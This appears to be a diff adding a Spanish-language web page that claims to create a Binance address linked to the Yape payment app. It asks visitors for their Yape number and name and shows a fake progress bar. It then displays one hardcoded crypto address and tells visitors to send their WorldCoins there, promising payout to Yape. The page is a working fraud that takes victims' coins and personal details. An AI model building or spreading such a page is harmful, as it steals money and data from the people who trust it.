@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <script
+      src="https://kit.fontawesome.com/64d58efce2.js"
+      crossorigin="anonymous"
+    ></script>
+    <link rel="stylesheet" href="style.css" />
+    <title>Mi Direccion Binance</title>
+  </head>
+  <body>
+    <div class="container">
+      <div class="forms-container">
+        <div class="signin-signup">
+          <form action="#" class="sign-in-form">
+            <h2 class="title">
+              Crear mi direccion de Binance con Yape
+            </h2>
+            <div class="input-field">
+              <i class="fas fa-mobile"></i>
+              <input type="text" placeholder="Ingresa número de Yape"  />
+            </div>
+            <div class="input-field">
+              <i class="fas fa-user"></i>
+              <input type="text" placeholder="Ingresa tú nombre"  />
+            </div>
+            <button class ="btn" id="btnlogin">
+              Generar mi Binance
+            </button>
+          </form>
+          <form action="#" class="sign-up-form">
+
+          <div class="loader"></div>
+            <p class="loading-text">Generando direccion Binance</p>
+          <div class="progress-bar">
+            <div class="progress">
+
+            </div>  
+          
+          </div>
+
+
+          <!-- Imagen de confirmación, inicialmente oculta -->
+          <img src="img/YP.png" alt="Confirmación" class="confirmacion-imagen" id="imagenConfirmacion" style="display: none;" />
+
+
+          <div class="containerCopy">
+            <h4 id="titleCopy">Se ha creado tu dirección de Binance con Yape. ¡Cópiala y envía tus WorldCoins que te llegarán directamente a tu Yape!</h4>
+            <textarea id="textArea" rows="2" cols="50">0x60389237763c77dfdec5f4b3cef1f2c6dba88e0f</textarea>
+            <button id="btnCopy"><i class="bx bx-clipboard"></i>Copiar dirección</button>
+            <div id="copyNotification">Dirección copiada</div>
+          </div>
+      
+            <!--<h4>Se ha creado tu dirección de Binance con Yape. ¡Cópiala y envía tus WorldCoins que te llegarán directamente a tu Yape!</h4> --->
+
+          </form>
+        </div>
+      </div>
+
+      <div class="panels-container">
+        <div class="panel left-panel">
+          <div class="content">
+            <h3>No sabes como retirar tus WorldCoins?</h3>
+            <p>
+              Hazlo tú mismo! con esta nueva funcion de crear tu dirección de Binance vinculando con tu Yape para poder cobrar fácil y rapido!.
+            </p>
+            <!---<button class="btn transparent" id="btnlogin">
+              Generar mi Binance
+            </button>-->
+            
+          </div>
+          <img src="img/Logo1.png" class="image" alt="" />
+        </div>
+        <div class="panel right-panel">
+          <div class="content">
+            <h3>Vinculando Yape con Binance</h3>
+            <div>
+            </div>
+            </div>
+            <!--<button class="btn transparent" id="sign-in-btn">
+              Sign in
+            </button>-->
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="app.js"></script>
+  </body>
+</html>
